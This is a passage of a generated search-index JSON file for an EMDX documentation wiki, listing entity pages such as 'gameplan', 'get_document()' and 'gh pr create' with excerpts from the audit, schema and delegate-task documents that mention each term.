\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>save a markdown file</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>list all documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>basic search</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>text search</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.2)</li> <li><code>project overview</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>most important</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>performance optimizations</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/gameplan/","title":"gameplan","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2025-07-12</p>"},{"location":"entities/gameplan/#documents-8","title":"Documents (8)","text":"<ul> <li>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Human Patterns <p>Tagging Approach:</p> </li> <li>Semantic tags for recall: <code>security</code>, <code>auth</code>, <code>todo</code></li> <li>Emoji tags for visual scanning in TUI: \ud83c\udfaf, \ud83d\udccb, \u2705</li> <li>Applied after reflection, sometimes via <code>--suggest-tags</code></li> <li> <p>Text aliases auto-convert: <code>gameplan</code> \u2192 \ud83d\udccb</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Key Features</p> <p>...ite FTS5 with ranking</p> </li> <li>Tag system: Emoji-based tags with text aliases (e.g., <code>gameplan</code> \u2192 \ud83c\udfaf)</li> <li>Project organization: Auto-detection from git repositories</li> <li> <p>Trash management: Soft delete with restore capability</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Key Features</p> </li> <li>Emoji-based tags with text aliases (<code>gameplan</code> \u2192 \ud83c\udfaf)</li> <li>Tag filtering in searches</li> <li> <p>Auto-tagging based on content analysis</p> </li> <li> <p>#4754 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Common Themes Across All Analyses</p> <p>.... Key Features</p> </li> <li>Emoji Tag System: Text aliases \u2192 emoji conversion (e.g., <code>gameplan</code> \u2192 \ud83c\udfaf)</li> <li>Full-Text Search: SQLite FTS5 with stemming and intelligent ranking</li> <li>AI Agent Framework: Configurable agents with multi-stage workflows</li> <li> <p>**Git Inte...</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: Architecture Analysis: EMDX Control Center v5 Implementation</p> <p>Analysis of gameplan #1833 \"EMDX Control Center v5 - The Feature Factory\" and current codebase readiness.</p> </li> <li> <p>#452 Minimal Tag Taxonomy - Space-Efficient   Section: Core Tags (Single Words Only)</p> </li> <li><code>gameplan</code> - Strategic plans</li> <li><code>analysis</code> - Investigation results  </li> <li> <p><code>notes</code> - General notes</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Core Workflow Tags</p> </li> <li><code>gameplan</code> - Strategic plans and approaches</li> <li><code>analysis</code> - Research and investigation results</li> <li><code>todo</code> - Action items and tasks</li> <li><code>notes</code> - General notes and observations</li> <li> <p><code>retrospective</code> - Post-project analysis</p> </li> <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> <p>...Automated Workflow Tagging Claude Code could automatically apply workflow tags:</p> </li> <li><code>gameplan</code>, <code>analysis</code>, <code>todo</code>, <code>in-progress</code>, <code>completed</code></li> <li><code>successful</code>, <code>failed</code>, <code>blocked</code>, <code>needs-review</code></li> <li><code>priority-high</code>, <code>priority-medium</code>, <code>priority-low</code></li> </ul>"},{"location":"entities/gameplan/#2-tagging-system","title":"2. Tagging System","text":""},{"location":"entities/gameplan/#document-types","title":"Document Types","text":""},{"location":"entities/gameplan/#document-types_1","title":"Document Types","text":""},{"location":"entities/gameplan/#related-entities","title":"Related Entities","text":"<ul> <li><code>version:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>urgent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>tag system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>successful</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>success tracking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>project-&lt;name&gt;-review</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>project-&lt;name&gt;-planning</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>priority-medium</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>priority-low</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>priority-high</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/gameplanid/","title":"gameplan_id","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/gameplanid/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: 1. Core Overlap: Tasks vs Tagged Documents**</p> <p>...e/failed) | Status tags: \ud83d\ude80active, \u2705done, \ud83d\udea7blocked, \u274cfailed | | Planning context | <code>gameplan_id</code> \u2192 documents | <code>parent_id</code> + \ud83c\udfafgameplan tag | | Work items | Separate <code>tasks</code> table | Documents with \"task\" tag | | Progress logging | <code>task_log</code> table | Child docume...</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...e, failed | | <code>priority</code> | INTEGER | 3 | Priority level (1=highest, 5=lowest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan) | | <code>project</code> | TEXT | NULL | Project name filter | | <code>current_step</code> | TEXT | NULL | Current step for resumpt...</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...<code>status</code>: open | active | blocked | done | failed</p> </li> <li><code>priority</code>: 1-5 (default 3)</li> <li><code>gameplan_id</code>: Links to documents table</li> <li><code>project</code>: Project name</li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p><code>created_at</code>, <code>updated_at</code>, <code>completed_at</code>: Timestamps</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Task System Architecture</p> <p>...` table with:</p> </li> <li><code>status</code>: open, active, blocked, done, failed</li> <li><code>priority</code>: 1-5</li> <li><code>gameplan_id</code>: links to a gameplan document</li> <li><code>depends_on</code>: dependency graph via <code>task_deps</code> table</li> <li> <p>Fields for tracking <code>emdx delegate</code> executions: <code>prompt</code>, <code>execution_id</code>, `ou...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...| \"open\" | Current state | | <code>priority</code> | INTEGER | 3 | Priority (1=highest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan association) | | <code>project</code> | TEXT | NULL | Project name filter | | <code>current_step</code> | TEXT | NULL | Current step...</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> <p>...ures**: </p> </li> <li>Dependency management with cycle detection</li> <li>Gameplan association (<code>gameplan_id</code>)</li> <li>Progress logging (<code>task_log</code> table)</li> <li> <p>Ready-task queries (open + all deps done)</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: The Task Table Has Dual Purposes</p> <ol> <li>Manual to-do tracking: <code>title</code>, <code>description</code>, <code>priority</code>, <code>gameplan_id</code>, <code>project</code>, <code>depends_on</code></li> </ol> </li> <li> <p>Delegate activity logging: <code>prompt</code>, <code>type</code> (single/group/chain), <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>parent_task_id</code>...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> <p>...table)</p> </li> <li><code>source_doc_id</code> \u2014 input document</li> <li><code>tags</code>, <code>prompt</code>, <code>type</code> \u2014 metadata</li> <li><code>gameplan_id</code>, <code>project</code> \u2014 organization</li> </ul>"},{"location":"entities/gameplanid/#related-entities","title":"Related Entities","text":"<ul> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.7)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>update_task(id, **kwargs)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task_log table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.5)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/getdocument/","title":"get_document()","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/getdocument/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6505 None Type Analysis [3/7]   Section: Return Types with <code>| None</code></p> <p>...| Verdict | Reasoning | |----------|-------------------|---------|-----------| | <code>get_document()</code> L73 | <code>-&gt; DocumentRow \\| None</code> | \u2705 NECESSARY | Returns None if not found | | <code>find_supersede_candidate()</code> L532 | <code>-&gt; SupersedeCandidate \\| None</code> | \u2705 NECESSARY | Ret...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: documents.py (12 functions)</p> Function Proposed Type <code>get_document()</code> <code>DocumentRow \\| None</code> <code>list_documents()</code> <code>list[DocumentListItem]</code> <code>get_recent_documents()</code> <code>list[RecentDocumentItem]</code> <code>get_stats()</code> `DatabaseSta... </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]   Section: Functions and Their New Return Types</p> <p>...rse_doc_datetimes()<code>|</code>dict[str, Any]<code>|</code>T<code>(generic, preserves input type) | |</code>get_document()<code>|</code>dict[str, Any] | None<code>|</code>DocumentRow | None<code>| |</code>list_documents()<code>|</code>list[dict[str, Any]]<code>|</code>list[DocumentListItem]<code>| |</code>get_recent_documents()<code>|</code>list[d...</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 2. Race Conditions</p> <ul> <li><code>cascade.py:67-87</code> \u2014 Non-atomic check-then-act in <code>update_cascade_stage()</code></li> </ul> </li> <li><code>documents.py:58-95</code> \u2014 Read-modify-write in <code>get_document()</code> without isolation</li> <li> <p><code>file_watcher.py:76-81</code> \u2014 TOCTOU between <code>exists()</code> and <code>stat()</code></p> </li> <li> <p>#6379 Codebase Bug Audit 2026-02-15 [10/10]   Section: MEDIUM SEVERITY ISSUES (8)</p> </li> <li> <p>#6376 Codebase Bug Audit 2026-02-15 [1/10]   Section: HIGH Issues</p> <p>...t (documents.py:58-95) Severity: HIGH File: documents.py:58-95 Bug: <code>get_document()</code> performs UPDATE (access tracking) then SELECT without transaction isolation. Another process could delete the document between UPDATE and SELECT, returning stale da...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Recent Bug Fix (Current Branch)</p> <p>Issue: Internal <code>get_document()</code> calls were inflating <code>access_count</code>.</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 5. MUTABLE DICT RETURNS</p> <p>High-Risk Locations:</p> </li> <li><code>database/documents.py:get_document()</code> \u2014 Returns mutable dict</li> <li><code>cascade_service.py:27</code> \u2014 Re-exports <code>get_document</code> directly</li> <li> <p><code>models/tasks.py:get_task()</code> \u2014 Returns <code>dict(row)</code> directly</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> <p>...ods return <code>dict</code> without specifying structure. Functions like <code>save_document()</code>, <code>get_document()</code> return untyped dicts that could cause KeyError at runtime Severity: CRITICAL</p> </li> </ul>"},{"location":"entities/getdocument/#11-unicode-handling-in-get_document-lookups","title":"11. Unicode Handling in <code>get_document()</code> Lookups","text":"<p>File: <code>emdx/database/documents.py:82-92</code> Severity: Medium</p>"},{"location":"entities/getdocument/#related-entities","title":"Related Entities","text":"<ul> <li><code>list_deleted_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>use</code>from future import annotations`` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>offset</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>multiple locations</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>list_recent_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>list[searchresult]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>list[recentdocumentitem]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>list[documentrow]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>stat()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>list_groups()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/gh-pr-create/","title":"gh pr create","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/gh-pr-create/#documents-12","title":"Documents (12)","text":"<ul> <li>#6870 Delegate: FEAT-32 (Issue #1244): Add wiki topic merge and split comman [1/2]   Section: Tests \u2014 19 tests, all passing <p>...R</p> </li> <li>Branch pushed: <code>delegate/feat-32-issue-1244-add-wiki-topic-merge-8c2a5</code></li> <li> <p>The <code>gh pr create</code> command was blocked by permission settings. PR can be created at: https://github.com/arockwell/emdx/pull/new/delegate/feat-32-issue-1244-add-wiki-topic-merge-8c2a5...</p> </li> <li> <p>#6853 Delegate: FIX-6: Investigate delegate --pr permission failures (FIX-4/ [4/4]   Section: Root Cause: Space-in-Pattern Parsing Bug</p> <p>When space-joined, <code>Bash(gh pr:*)</code> may get split into <code>Bash(gh</code> + <code>pr:*)</code> by Claude Code's parser, making it an invalid pattern. This means <code>gh pr create</code> is not actually pre-authorized.</p> </li> <li> <p>#6852 FIX-6: Delegate --pr Permission Failures Analysis   Section: Summary</p> <p>The <code>delegate --pr</code> flag intermittently fails with permission errors when agents try to <code>git push</code> or <code>gh pr create</code>. PR #777 (subcommand routing fix) did NOT resolve this \u2014 failures continued after its merge.</p> </li> <li> <p>#6849 Delegate: FIX-5: In emdx/commands/delegate.py _run_parallel(), around  [2/4]   Section: Summary</p> <p>The <code>gh pr create</code> command needs your approval to run. Please approve it or create the PR manually:</p> </li> <li> <p>#6813 Delegate: Fix DOC-8: Update docs/cli-api.md TUI keyboard shortcuts sec [3/5]   Section: Summary</p> <p>...d-tui-keybo-89e9c<code>**Pushed:** Branch pushed to origin **PR:** Could not create \u2014</code>gh pr create` was blocked by permissions. PR can be created at: https://github.com/arockwell/emdx/pull/new/delegate/fix-doc-8-update-docscli-apimd-tui-keybo-89e9c...</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]</p> <p>I'm unable to get the <code>gh pr create</code> command approved in this environment. Let me summarize what was done:</p> </li> <li> <p>#6810 Delegate: Fix DOC-6: Update docs/cli-api.md with new task commands fro [1/5]</p> <p>I'm unable to get permission to run <code>gh pr create</code> in this session. Let me summarize what was done and provide the command for manual PR creation.</p> </li> <li> <p>#6750 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</p> </li> </ul>"},{"location":"entities/gh-pr-create/#un-12","title":"Un [1/2]","text":"<p>Section: What was implemented:</p> <p>To complete: <code>git push -u origin delegate/design-unified-dashboard-data-model-unif-7bc18</code> then <code>gh pr create</code>.</p> <ul> <li> <p>#6694 Fix emdx delete auto-confirm for non-TTY   Section: Summary</p> <p>All code changes are committed and pushed to <code>delegate/fix-emdx-delete-auto-confirm-for-non-tty-b5403</code>. The <code>gh pr create</code> command is being blocked by the permission system, so the PR needs to be created manually.</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Git Worktree Flow</p> <p>...t works in isolated worktree</p> </li> <li>For <code>--pr</code>: agent commits, pushes, creates PR via <code>gh pr create</code></li> <li>For <code>--branch</code>: agent commits, pushes (no PR)</li> <li> <p>Worktree cleanup: automatic after <code>--pr</code>, retained after <code>--branch</code></p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Background</p> <p>Currently, <code>emdx delegate --pr</code> creates regular (non-draft) PRs via <code>gh pr create</code>. Users want a lighter-touch mode where delegates create draft PRs for review before merging. This helps with quality control\u2014delegate output gets human review befor...</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: How It Works</p> <p>Each task:</p> </li> <li>Reads its gameplan doc from emdx KB</li> <li>Explores the emdx codebase</li> <li>Implements the feature</li> <li>Creates a git branch, commits, pushes</li> <li>Creates a PR via <code>gh pr create</code></li> <li>Saves output to emdx KB</li> </ul>"},{"location":"entities/gh-pr-create/#related-entities","title":"Related Entities","text":"<ul> <li><code>read</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>pr:*)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>bash(gh:*)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>bash(gh pr:*)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>bash(gh pr view:*)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>bash(gh pr list:*)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>bash(gh pr create:*)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>bash(gh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>--allowedtools</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>\" \".join(allowed)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/gistpy/","title":"gist.py","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2026-01-11</p>"},{"location":"entities/gistpy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>description: str | None = typer.Option(None, ...)</code> - Legitimate: optional description</li> <li> <p><code>update: str | None = typer.Option(None, ...)</code> - Legitimate: optio...</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>...Found in:</p> </li> <li><code>core.py</code>: lines 584-588, 657-661</li> <li><code>tags.py</code>: lines 44-48, 156-159</li> <li><code>gist.py</code>: lines 197-200</li> <li> <p><code>groups.py</code>: lines 97-100</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...service.py<code>| | 7 commands bypass services layer | HIGH |</code>core.py<code>,</code>browse.py<code>,</code>gist.py<code>,</code>groups.py<code>,</code>tags.py<code>,</code>trash.py<code>import</code>database/<code>directly | | 2 layer violations | MEDIUM |</code>database/documents.py<code>imports from</code>models/tags<code>(upward);</code>util...</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...uments (trash)\" | | <code>browse.py</code> | \"Browse and list documents with statistics\" | | <code>gist.py</code> | \"GitHub Gist integration\" | | <code>executions.py</code> | \"Manage and monitor task executions\" | | <code>status.py</code> | \"Show delegate activity and project status\" | | <code>prime.py</code>...</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 1. Added Help Text to 5 Typer Apps (Missing Documentation)</p> <p>...edit, delete\" | | <code>executions.py</code> | \"Monitor and manage delegate executions\" | | <code>gist.py</code> | \"GitHub Gist integration for sharing documents\" | | <code>trash.py</code> | \"Manage deleted documents (trash)\" |</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...TIAL (<code>test_execution_system*.py</code> tests models, not CLI) | | <code>gdoc.py</code> | \u274c NO | | <code>gist.py</code> | \u274c NO | | <code>groups.py</code> | \u2705 YES (<code>test_commands_groups.py</code>) | | <code>maintain.py</code> | \u274c NO | | <code>prime.py</code> | \u274c NO | | <code>recipe.py</code> | \u274c NO | | <code>similarity.py</code> | \u26a0\ufe0f PARTIAL (t...</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...y index eb95c23..c040958 100644 --- a/e... [00:02:53] \ud83d\udcc4 Tool result: emdx/commands/gist.py:from emdx.utils.output import console emdx/commands/browse.py:from emdx.utils.... [00:02:55] \ud83d\udcbb Using tool: Bash [00:02:56] \ud83d\udcbb Using tool: Bash [00:02:56] \ud83d\udcbb Using tool...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...**: All necessary</p> </li> <li>stale.py: All necessary</li> <li>recipe.py: All necessary</li> <li>gist.py: All necessary</li> <li>epics.py: All necessary</li> <li>ask.py: All necessary</li> <li>analyze.py: All necessary</li> <li>trash.py: All necessary</li> <li> <p>review.py: All necessa...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...| 253 | REDUNDANT - TUI browser. Could be simplified or merged with GUI. | | gist.py | 279 | NICHE - GitHub gist export. Used infrequently. | | epics.py | 147 | THIN - Epic management. Just wraps task system. | | categories.py | 97...</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> <p>...restore, purge)\"</p> </li> <li>executions.py: \"Monitor and manage execution processes\"</li> <li>gist.py: \"Create and manage GitHub gists from documents\"</li> <li>browse.py: \"Browse documents and view statistics\"</li> </ul>"},{"location":"entities/gistpy/#gistpy_1","title":"gist.py","text":""},{"location":"entities/gistpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>typer apps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>added help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>gdoc.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 